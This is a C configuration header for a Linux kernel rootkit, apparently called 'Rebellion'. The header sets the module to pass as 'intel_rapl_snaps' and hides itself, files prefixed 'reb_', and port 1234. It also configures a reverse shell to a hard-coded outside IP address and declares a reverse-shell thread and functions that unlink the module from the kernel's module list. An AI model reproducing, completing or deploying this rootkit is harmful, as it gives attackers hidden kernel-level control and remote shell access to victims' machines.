/*
 ██▀███  ▓█████  ▄▄▄▄    ▄▄▄▄   ▓█████  ██▓     ██▓ ▒█████   ███▄    █ 
▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓█████▄ ▓█   ▀ ▓██▒    ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██▒ ▄██▒███   ▒██░    ▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██░    ░██░▒██   ██░▓██▒  ▐▌██▒
░██▓ ▒██▒░▒████▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██████▒░██░░ ████▓▒░▒██░   ▓██░
░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                                                                                                                                      
*/
#ifndef CONFIG_H
#define CONFIG_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/skbuff.h>

#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("br0sck");
MODULE_DESCRIPTION("Ring 0  for Linux Kernels x86/x86_64 5.x/6.x");

//=====================[YOU CAN CHANGE THIS]========================//
#define MODULENAME "intel_rapl_snaps"      // if you change the file name, you must change it here too
#define HIDE_PORT 1234              // 
#define MAGIC_PREFIX "reb_"         // folder/file prefix to hide
//==========[REVERSE SHELL]=========//
#define YOUR_SRV_IP "77.110.126.70"     // 
#define YOUR_SRV_PORT 1234          // 
//==================================//
#define SIGUSR1 10                  //
#define SIGUSR2 12                  // 
//==================================================================//

#define TRUE 1
#define FALSE 0

bool isModuleHidden = FALSE;
static struct list_head *modPrevious;
static struct list_head *modKOBJPrevious;

void hideModule(void);
void showModule(void);

static struct task_struct *revshell_thread;
static bool execute_shell = false;

#endif // !CONFIG_H